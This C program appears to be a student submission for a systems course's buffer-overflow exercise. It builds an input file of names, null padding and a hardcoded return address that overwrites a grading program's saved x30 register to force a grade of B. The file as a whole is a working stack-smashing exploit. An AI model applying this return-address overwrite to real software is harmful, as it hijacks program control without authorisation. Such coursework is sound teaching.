/*
   createdataB.c
   Ben Zhou and Owen Clarke
*/

/*
   Produces a file called dataB with the student name's Ben Zhou and
   Owen Clarke, a nullbyte, more null bytes as padding to overrun the
   stack, and the address of the instruction in main to get a B, the
   latter of which will overwrite getName's stored x30
*/

#include <stdio.h>

/*
   main does not accept any command-line arguments or read from stdin,
   but writes to dataB as described in the file comment above
*/
int main(void)
{
    FILE *psFile;
    int i;
    /* Address of the instruction in TEXT to change the grade to a B */
    unsigned long returnAddr = 0x400890;

    psFile = fopen("dataB", "w");

    /* Student names: 24 bytes */
    fprintf(psFile, "Ben Zhou and Owen Clarke");

    /* Terminating null byte: 1 byte */
    putc('\0', psFile);

    /* 23 more null bytes to fill up 48 bytes of buffer */
    for (i = 0; i < 23; i++)
        putc('\0', psFile);

    /* Overwritten return address */
    fwrite(&returnAddr, sizeof(unsigned long), 1, psFile);

    fclose(psFile);
    return 0;
}